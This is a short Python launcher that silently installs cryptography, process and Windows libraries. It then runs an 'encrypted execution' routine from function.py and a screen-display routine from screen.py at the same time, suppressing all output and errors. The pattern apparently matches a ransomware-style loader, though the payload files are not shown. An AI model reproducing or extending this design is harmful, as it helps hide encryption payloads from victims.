import subprocess
import sys
import importlib.util
import os
import threading

def 安装依赖():
    packages = ['pycryptodome', 'psutil', 'pywin32']
    for pkg in packages:
        try:
            if pkg == 'pycryptodome':
                import_name = 'Crypto'
            elif pkg == 'pywin32':
                import_name = 'win32api'
            else:
                import_name = pkg
            
            if importlib.util.find_spec(import_name) is None:
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', pkg], 
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

def 运行文件套件():
    try:
        if os.path.exists('function.py'):
            spec = importlib.util.spec_from_file_location("funcmodule", "function.py")
            func_module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(func_module)
            
            if hasattr(func_module, '主执行流程'):
                func_module.主执行流程()
            elif hasattr(func_module, '加密执行'):
                func_module.加密执行()
    except Exception:
        pass

def 运行界面模块():
    try:
        if os.path.exists('screen.py'):
            spec = importlib.util.spec_from_file_location("screenmodule", "screen.py")
            screen_module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(screen_module)
            
            if hasattr(screen_module, 'display_interface'):
                screen_module.display_interface()
            elif hasattr(screen_module, 'show_interface'):
                screen_module.show_interface()
    except Exception:
        pass

def 同时运行():
    线程1 = threading.Thread(target=运行文件套件)
    线程2 = threading.Thread(target=运行界面模块)
    
    线程1.daemon = True
    线程2.daemon = True
    
    线程1.start()
    线程2.start()
    
    线程1.join()
    线程2.join()

if __name__ == '__main__':
    安装依赖()
    同时运行()